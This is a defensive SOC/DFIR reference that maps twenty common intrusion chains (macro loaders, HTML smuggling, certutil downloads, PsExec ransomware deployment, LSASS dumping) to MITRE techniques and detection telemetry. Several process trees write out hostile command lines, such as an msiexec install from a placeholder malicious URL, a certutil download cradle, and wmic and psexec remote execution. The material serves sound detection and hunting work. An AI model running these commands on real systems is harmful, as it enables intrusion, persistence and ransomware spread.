# Behavioural Attack Chains (Comprehensive SOC/DFIR Reference)

This document provides a complete set of **realistic, high-fidelity attack chains** covering the most common and most dangerous intrusion paths seen in SOC and Incident Response environments.

Each chain includes:

- A clear **ASCII process tree**
- **Full payload behaviour** (stagers → loaders → C2 → persistence → lateral movement)
- **MITRE ATT&CK mappings**
- **Why attackers use this technique**
- **Telemetry you must pivot to** for investigation

Attackers frequently chain multiple LOLBins together to remain invisible to basic EDR detection and to avoid dropping obvious binaries. These sequences represent the actual behaviours observed across ransomware incidents, APT intrusions, financial malware, loaders, droppers, remote access trojans and HTML-smuggling campaigns.

Use this document to guide:

- Detection engineering  
- Threat hunting  
- Process ancestry analysis  
- Incident response triage  
- KQL analytics and queries  
- Playbook development  

---

# Chain 1 — Phishing Doc → Macro → PowerShell Loader → C2
outlook.exe


`  └─ winword.exe (macro-enabled doc)`
  
       └─ powershell.exe (encoded stager)
       
            └─ loader.ps1 (download/decrypt)
            
                 └─ payload.exe
                 
                      └─ C2 beacons / recon / credential theft


Context / Reasoning

MITRE:
T1566.001 (Phishing Attachment)  
T1059.001 (PowerShell)  
T1204 (User Execution)  
T1105 (Tool Transfer)  
T1082 (System Discovery)

Why attackers use it:
• Macro → PowerShell gives full interpreter access  
• Encoded commands hide payload logic  
• Perfect for staging RATs, loaders, or C2 implants  

Telemetry:
DeviceProcessEvents: winword.exe → powershell.exe  
DeviceNetworkEvents: powershell.exe outbound  
DeviceFileEvents: loader/temp EXE writes  


# Chain 2 — HTML Smuggling → MSHTA → PowerShell → Payload

outlook.exe / browser.exe

`  └─ mshta.exe (remote .hta or javascript:/vbscript:)`
 
       └─ powershell.exe (download cradle)
            └─ decode → unpack → payload.exe
                 └─ persistence (registry/scheduled task)
                      └─ C2 over HTTPS`


Context / Reasoning

MITRE:
T1218.005 (Mshta)  
T1059.001 (PowerShell)  
T1105 (Download)  
T1204 (User Execution)

Why attackers use it:
• HTML smuggling bypasses attachment filtering  
• mshta.exe is signed and trusted  
• Easy to update remote script on attacker host  

Telemetry:
DeviceProcessEvents: mshta.exe parent is browser or Office  
DeviceNetworkEvents: mshta.exe making remote requests  
DeviceFileEvents: dropped payloads in %TEMP%  


# Chain 3 — Script Dropper → WScript/CScript → PowerShell → Scheduled Task
`outlook.exe`

`└─ winword.exe
       └─ wscript.exe (malicious VBS/JS)
            └─ powershell.exe (stager)
                 └─ schtasks.exe /create (persistence)
                      └─ payload.exe runs on schedule
                           └─ C2 + privilege escalation`
`

Context / Reasoning

MITRE:
T1059.005 (Script Execution)  
T1059.001 (PowerShell)  
T1053.005 (Scheduled Task)  
T1547 (Persistence)

Why attackers use it:
• Ensures persistence even after reboot  
• Script loaders hide malicious logic  
• Extremely common in Emotet/Qakbot ecosystems  

Telemetry:
DeviceProcessEvents: Word → wscript → PS → schtasks  
DeviceFileEvents: payload dropped into AppData/Temp  
Scheduled Task logs  


# Chain 4 — MSI Loader → Rundll32 → Payload
`browser.exe / outlook.exe`

 ` └─ msiexec.exe /i https://malicious/payload.msi /qn
       └─ rundll32.exe malicious.dll,ExportFunc
            └─ payload.exe (stager)
                 └─ upload system info
                      └─ retrieve second-stage binary
                           └─ C2`


Context / Reasoning

MITRE:
T1218.007 (Msiexec)  
T1218.011 (Rundll32)  
T1055 (DLL Injection)

Why attackers use it:
• MSI packages look legitimate  
• Rundll32 naturally loads DLL exports  
• Perfect delivery system for banker or RAT DLLs  

Telemetry:
DeviceProcessEvents: msiexec parented by browser  
DeviceNetworkEvents: msiexec remote download  
DeviceFileEvents: DLL written to user directories  


# Chain 5 — Certutil → Download → Decode → Execute → C2

`powershell.exe / cmd.exe
  └─ certutil.exe -urlcache -split -f http(s)://... payload.b64
       └─ certutil.exe -decode payload.b64 payload.exe
            └─ payload.exe
                 └─ enumerate system
                      └─ drop persistence module
                           └─ C2 beaconing`


Context / Reasoning

MITRE:
T1105 (Ingress Tool Transfer)  
T1140 (Decode Files)  
T1041 (Exfil/Transfer)

Why attackers use it:
• Native Windows tool  
• Avoids Invoke-WebRequest detections  
• Built-in decoding pipeline  

Telemetry:
DeviceProcessEvents: certutil usage  
DeviceFileEvents: .b64 → .exe  
DeviceNetworkEvents: outbound connections  


# Chain 6 — Service-Based Persistence with sc.exe
`powershell.exe / dropper.exe
  └─ sc.exe create <svc_name> binPath="<userdir>\svc.exe" start=auto
       └─ services.exe on reboot
            └─ svc.exe
                 └─ injects credential theft module
                      └─ scans network shares
                           └─ C2`


Context / Reasoning

MITRE:
T1543.003 (Windows Service Creation)  
T1569.002 (Service Execution)

Why attackers use it:
• SYSTEM privileges  
• Automatic persistence  
• Extremely common in ransomware staging  

Telemetry:
DeviceProcessEvents: sc.exe create  
DeviceRegistryEvents: new Service key  
DeviceFileEvents: svc.exe in suspicious directory  


# Chain 7 — WMI Remote Execution
`powershell.exe / script.exe
  └─ wmic.exe /node:<target> process call create "cmd.exe /c payload.exe"
       └─ target: cmd.exe
            └─ payload.exe
                 └─ C2 + lateral movement staging`


Context / Reasoning

MITRE:
T1047 (WMI Exec)  
T1021.006 (WMI Lateral Movement)

Why attackers use it:
• Silent execution on remote hosts  
• No file copy required (if command pulls remote payload)  
• Very stealthy in flat networks  

Telemetry:
DeviceProcessEvents: wmic with remote exec  
Target host logs: cmd.exe launched with network context  
DeviceNetworkEvents: RPC/DCOM traffic  


# Chain 8 — PsExec Lateral Movement → Ransomware Deployment
`malware.exe / script.ps1
  └─ psexec.exe \\target -s -d cmd.exe /c \\share\payload.exe
       └─ target: psexesvc.exe
            └─ cmd.exe /c \\share\payload.exe
                 └─ payload.exe
                      └─ encrypt files
                           └─ delete shadow copies
                                └─ beacon to C2 or drop ransom note`


Context / Reasoning

MITRE:
T1021.002 (SMB Admin Shares)  
T1569.002 (Service Execution)  
T1486 (Data Encryption)

Why attackers use it:
• Allows parallel deployment across dozens of hosts  
• Perfect for ransomware distribution  
• Admin credentials make this trivial  

Telemetry:
DeviceFileEvents: ADMIN$ writes  
DeviceProcessEvents: psexec activities  
SecurityEvent: service creation (7045)  


# Chain 9 — Fileless LOLBin → PowerShell → Rundll32 → Dllhost C2
`winword.exe
  └─ wscript.exe / mshta.exe
       └─ powershell.exe (-enc)
            └─ rundll32.exe (shellcode loader)
                 └─ dllhost.exe (injected)
                      └─ steady outbound C2
                           └─ credential harvesting commands
                                └─ lateral movement prep`


Context / Reasoning

MITRE:
T1059.x (Script + PS)  
T1218.x (Mshta/Rundll32)  
T1055 (Injection)

Why attackers use it:
• Hard to detect  
• Minimal disk artifacts  
• dllhost.exe is extremely noisy, blends well  

Telemetry:
dllhost.exe network activity  
Process ancestry from Office → script → PS → rundll32  


# Chain 10 — DLL Search Order Hijacking
`legitimate.exe
  └─ malicious.dll
       └─ loader inside DLL
            └─ payload.exe
                 └─ privilege escalation
                      └─ C2 communication`


Context / Reasoning

MITRE:
T1574.002 (DLL Order Hijack)  
T1055 (Injection)

Telemetry:
DLL loaded from user path  
legitimate.exe spawning unexpected children  


# Chain 11 — Browser Exploit → PowerShell → Payload
`chrome.exe / msedge.exe
  └─ (exploit shellcode)
       └─ powershell.exe
            └─ stager.ps1
                 └─ payload.exe
                      └─ privilege escalation module
                           └─ C2`


Context / Reasoning

MITRE:
T1203 (Exploitation)  
T1059.001 (PowerShell)

Telemetry:
powershell spawned by browser  
memory anomalies in browser process  


# Chain 12 — ISO/VHD → App.exe → Malicious DLL → Payload
`explorer.exe
  └─ mount.iso
       └─ app.exe
            └─ malicious.dll
                 └─ loader stub
                      └─ payload.exe
                           └─ beacon + persistence`


Context / Reasoning

MITRE:
T1204 (User Execution)  
T1574.002 (DLL Hijacking)

Telemetry:
EXEs launched from mounted volumes  
DLL loads from same path  


# Chain 13 — LNK → LOLBin → Stager → Payload
`explorer.exe
  └─ malicious.lnk
       └─ powershell.exe / mshta.exe
            └─ stager
                 └─ payload.exe
                      └─ registry persistence
                           └─ C2`


Context / Reasoning

MITRE:
T1204 (LNK Execution)  
T1059.x (LOLBins)

Telemetry:
cmdline arguments inside .lnk  
LOLBin spawned directly by explorer  


# Chain 14 — ZIP → JS/VBS → LOLBin → Payload
`explorer.exe
  └─ unzip malicious.zip
       └─ wscript.exe script.js
            └─ powershell.exe
                 └─ stager
                      └─ payload.exe
                           └─ reconnaissance
                                └─ C2`


Context / Reasoning

MITRE:
T1059.005 (Script)  
T1204 (User Exec)

Telemetry:
script engines spawning LOLBins  
script content analysis  


# Chain 15 — Browser → CMD → PowerShell → Payload (One-Click Drive-By)
`browser.exe
  └─ cmd.exe /c (hidden window)
       └─ powershell.exe (downloadstring/encoded)
            └─ payload.exe
                 └─ persistence install
                      └─ C2 + credential theft`


Context / Reasoning

MITRE:
T1059.003 (CMD)  
T1059.001 (PowerShell)

Telemetry:
cmd.exe spawned by browser → major red flag  
C2 after browser event  


# Chain 16 — PowerShell → Rundll32 → dllhost Injection → C2
`powershell.exe
  └─ rundll32.exe malicious.dll
       └─ injects into dllhost.exe
            └─ dllhost.exe
                 └─ C2 beacon
                      └─ command execution modules
`

Context / Reasoning

MITRE:
T1055 (Injection)  
T1218.011 (Rundll32)

Telemetry:
unexpected dllhost network traffic  


# Chain 17 — PowerShell → Inline C# → Shellcode → Memory Beacon
`powershell.exe
  └─ reflection / Add-Type
       └─ inject shellcode into process memory
            └─ in-memory RAT
                 └─ C2 over HTTPS`


Context / Reasoning

MITRE:
T1620 (Reflective Load)  
T1059.001 (PS)

Telemetry:
ScriptBlock logs  
PS using reflection APIs  


# Chain 18 — RDPClip → Clipboard Exfiltration
`mstsc.exe
  └─ rdpclip.exe
       └─ clipboard copy
            └─ memory mapped data
                 └─ exfil via RDP session`


Context / Reasoning

MITRE:
T1114 (Data Exfil)  
T1021.001 (RDP)

Telemetry:
clipboard anomalies  
remote session logs  


# Chain 19 — BYOVD → Kernel Manipulation → Payload
`dropper.exe
  └─ install vulnerable_driver.sys
       └─ driver disables protections
            └─ payload.exe
                 └─ ransomware staging
                      └─ C2`


Context / Reasoning

MITRE:
T1068 (Priv Esc)  
T1562.001 (Disable Security Tools)

Telemetry:
driver installation events  
.sys dropped in drivers  


# Chain 20 — Credential Dump → LSASS → Exfil
`malicious.exe
  └─ read LSASS memory
       └─ generate lsass.dmp
            └─ parse credentials
                 └─ exfil via HTTPS
                      └─ lateral movement next`


Context / Reasoning

MITRE:
T1003.001 (LSASS Dump)  
T1041 (Exfil)

Telemetry:
lsass handle access  
dump file creation  
outbound exfil shortly afterward  

